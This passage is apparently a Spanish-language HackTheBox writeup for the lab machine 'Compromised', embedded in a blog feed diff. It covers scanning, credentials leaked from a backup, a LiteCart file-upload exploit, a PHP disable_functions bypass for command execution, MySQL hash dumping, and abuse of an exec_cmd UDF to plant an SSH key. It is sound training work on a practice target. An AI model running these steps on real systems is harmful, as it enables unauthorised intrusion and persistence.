-bash-4.4# cd /root
-bash-4.4# cat root.txt 
-a4f562d7949903aa1bf84994c94ce9e3
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Magic</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Magic</guid>
-        
-        <category>sql injection</category>
-        
-        <category>bypass upload file</category>
-        
-        <category>information leaked</category>
-        
-        <category>abusing mysql</category>
-        
-        <category>absusing suid</category>
-        
-        <category>path hijacking</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Compromised - htb writeup</title>
-        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Compromised&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a &lt;code&gt;litercart&lt;/code&gt; que conjunto al crearnos una función propia en &lt;code&gt;php&lt;/code&gt; que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de &lt;code&gt;UDF&lt;/code&gt; en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un &lt;code&gt;rootkit&lt;/code&gt; ganar tener acceso al sistema como el usuario privilegiado &lt;code&gt;rooot&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Compromissed
-❯ ls
- Compromissed
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.207
-PING 10.10.10.207 (10.10.10.207) 56(84) bytes of data.
-64 bytes from 10.10.10.207: icmp_seq=1 ttl=63 time=207 ms
-
---- 10.10.10.207 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 206.547/206.547/206.547/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.207 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:35 GMT
-Initiating SYN Stealth Scan at 15:35
-Scanning 10.10.10.207 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.207
-Discovered open port 22/tcp on 10.10.10.207
-Completed SYN Stealth Scan at 15:35, 26.53s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.207
-Host is up, received user-set (0.13s latency).
-Scanned at 2023-06-13 15:35:29 GMT for 26s
-Not shown: 65533 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
-           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.207 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:36 GMT
-Nmap scan report for 10.10.10.207
-Host is up (0.21s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
-|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
-|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-title: Legitimate Rubber Ducks | Online Store
-|_Requested resource was http://10.10.10.207/shop/en/
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.207
-http://10.10.10.207 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[/shop]
-http://10.10.10.207/shop [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/], Title[301 Moved Permanently]
-http://10.10.10.207/shop/ [302 Found] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/en/], X-Powered-By[LiteCart]
-http://10.10.10.207/shop/en/ [200 OK] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], JQuery[3.3.1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a &lt;code&gt;Litecart&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap &lt;code&gt;http-enum&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script http-enum -p80 10.10.10.207 -oN webScan
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:42 GMT
-Nmap scan report for 10.10.10.207
-Host is up (0.22s latency).
-
-PORT   STATE SERVICE
-80/tcp open  http
-| http-enum: 
-|_  /backup/: Backup folder w/ directory listing
-
-Nmap done: 1 IP address (1 host up) scanned in 32.04 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Descubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre &lt;code&gt;shop&lt;/code&gt; el cual incluye a su vez varios directorios y archivos, en los cuale&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd shop
-❯ ls
- admin   cache   data   ext   images   includes   logs   pages   vqmod   favicon.ico   index.php  ﮧ robots.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . -name \*config\* | xargs cat | grep -iE &quot;user|pass|key&quot;
-    'name' =&amp;gt; language::translate('title_users', 'Users'),
-    'default' =&amp;gt; 'users',
-      'users' =&amp;gt; 'users.inc.php',
-      'edit_user' =&amp;gt; 'edit_user.inc.php',
-    order by priority, `key`;&quot;
-      'title' =&amp;gt; language::translate('settings_group:title_'.$group['key'], $group['name']),
-      'doc' =&amp;gt; $group['key'],
-    $app_config['docs'][$group['key']] = 'settings.inc.php';
-      'icon' =&amp;gt; 'fa-user',
-      'key' =&amp;gt; 'product_modal_window',
-      'key' =&amp;gt; 'sidebar_parallax_effect',
-      'key' =&amp;gt; 'compact_category_tree',
-      'key' =&amp;gt; 'cookie_acceptance',
-  define('DB_USERNAME', 'root');
-  define('DB_PASSWORD', 'changethis');
-  define('DB_TABLE_USERS',                             '`'. DB_DATABASE .'`.`'. DB_TABLE_PREFIX . 'users`');
- Password Encryption Salt
-  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Obtenemos unas credenciales correspondientes a la base de datos &lt;code&gt;root: changethis&lt;/code&gt; que procederemos a almancenar.&lt;/p&gt;
-
-&lt;p&gt;Ahora podemos ver qu dentro del directorio &lt;code&gt;admin&lt;/code&gt;, vemos un archivo de nombre &lt;code&gt;login.php&lt;/code&gt;, validamos si existe una ruta correspondiente en la web y efectivamente existe.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;despues al leer el archivo &lt;code&gt;login.php&lt;/code&gt;, podemos ver que comentada una ruta oculta con un archivo txt.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al validar la ruta obtenemos nuevas credenciales.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Validamos las credenciales y nos conectamos al servicio.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a buscar si existen vulnerabilidades asociadas a &lt;code&gt;litecart&lt;/code&gt; y vemos que existe un exploit en python2.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit litecart
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-LiteCart 2.1.2 - Arbitrary File Upload                                                                                                               | php/webapps/45267.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos traemos el exploit y lo ejecutamos con los parametros especificos&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
-Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/D5B8I.php?c=id
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;validamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por uno estatico de nombre &lt;code&gt;shell.php&lt;/code&gt; y ejecutaremos dentro del arhivo &lt;code&gt;phpinfo()&lt;/code&gt; para ver las funciones que estan desabilitadas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Volvemos a ejecutar nuevamente el exploit.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
-Shell =&amp;gt; http://10.10.10.207/shop/admin/../vqmod/xml/shell.php
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&quot;&gt;https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo &lt;code&gt;funct.php&lt;/code&gt;. Dentro lo que hace el codigo es crear una función con el nombre &lt;code&gt;pwn&lt;/code&gt;, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con &lt;code&gt;$_REQUEST['cmd]&lt;/code&gt;, para que atravez de &lt;code&gt;cmd&lt;/code&gt; pueda ejecutar instrucciones.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora modificaremos el exploit &lt;code&gt;litercart&lt;/code&gt;, para que nos suba el contenido de la nueva función creada &lt;code&gt;funct.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para simular una &lt;code&gt;tty&lt;/code&gt; utilizaremos la herramienta &lt;code&gt;tty_over_http&lt;/code&gt; de s4vitar.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp&quot;&gt;https://github.com/s4vitar/ttyoverhttp&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;El uso es simple solo debemos ingresar la url de nuestra shell en la solicitud &lt;code&gt;requests&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 tty_over_http.py
-&amp;gt; whoami
-&amp;gt; www-data
-ls
-&amp;gt; D5B8I.php
-fmiracle.php
-index.html
-shell.php
-python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
-&amp;gt; www-data@compromised:/var/www/html/shop$
-ls
-&amp;gt; ls
-admin  data  favicon.ico  includes   logs   robots.txt
-cache  ext   images	 index.php  pages  vqmod
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Recordemos que anteriormente obtuvimos credenciales de la base de datos &lt;code&gt;root:changethis&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@compromised:/var/www/html/shop$
- mysql -uroot -pchangethis -e &quot;select username, password from lc_users;&quot; ecom
-&amp;lt; -e &quot;select username, password from lc_users;&quot; ecom
-mysql: [Warning] Using a password on the command line interface can be insecure.
-+----------+------------------------------------------------------------------+
-| username | password                                                         |
-+----------+------------------------------------------------------------------+
-| admin    | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |
-+----------+------------------------------------------------------------------+
-www-data@compromised:/var/www/html/shop$
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Al seguir enumerando el sistema, vemos que existe un usuario &lt;code&gt;mysql&lt;/code&gt;, el cual tiene asignada una bash.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-lxd:x:105:65534::/var/lib/lxd/:/bin/false
-uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:109:1::/var/cache/pollinate:/bin/false
-sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
-sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
-mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
-red:x:1001:1001::/home/red:/bin/false
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como el usuario &lt;code&gt;mysql&lt;/code&gt; tiene una bash podria estar relacionado a los &lt;code&gt;UDF&lt;/code&gt;, que nos permiten definir funciones especificas.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat().&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select * from mysql.func&quot;
-&amp;lt;l -uroot -pchangethis -e &quot;select * from mysql.func&quot;
-mysql: [Warning] Using a password on the command line interface can be insecure.
-+----------+-----+-------------+----------+
-| name     | ret | dl          | type     |
-+----------+-----+-------------+----------+
-| exec_cmd |   0 | libmysql.so | function |
-+----------+-----+-------------+----------+
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;vemos que existe una función definida de nombre &lt;code&gt;exec_cmd&lt;/code&gt;, que al ejecutar un comando nos lo realiza exitosamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
-&amp;lt;ql -uroot -pchangethis -e &quot;select exec_cmd('pwd');&quot;
-mysql: [Warning] Using a password on the command line interface can be insecure.
-+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| exec_cmd('pwd')                                                                                                                                                                                                                                                                                                     |
-+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| /var/lib/mysql
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;No podemos entablarnos una reverse shell, pero recordemos que el puerto &lt;code&gt;22&lt;/code&gt; esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Creamos el directorio &lt;code&gt;.ssh&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
-&amp;lt;-e &quot;select exec_cmd('mkdir /var/lib/mysql/.ssh/');&quot;
-mysql: [Warning] Using a password on the command line interface can be insecure.
-+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| exec_cmd('mkdir /var/lib/mysql/.ssh/')                                 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Introducimos nuestra clave privada, renombrandola como &lt;code&gt;authorized_keys&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql -uroot -pchangethis -e &quot;select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
-&amp;lt;ot@hack4u &amp;gt; /var/lib/mysql/.ssh/authorized_keys');&quot;
-mysql: [Warning] Using a password on the command line interface can be insecure.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mysql@10.10.10.207
-Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
-mysql@compromised:~$ whoami
-mysql
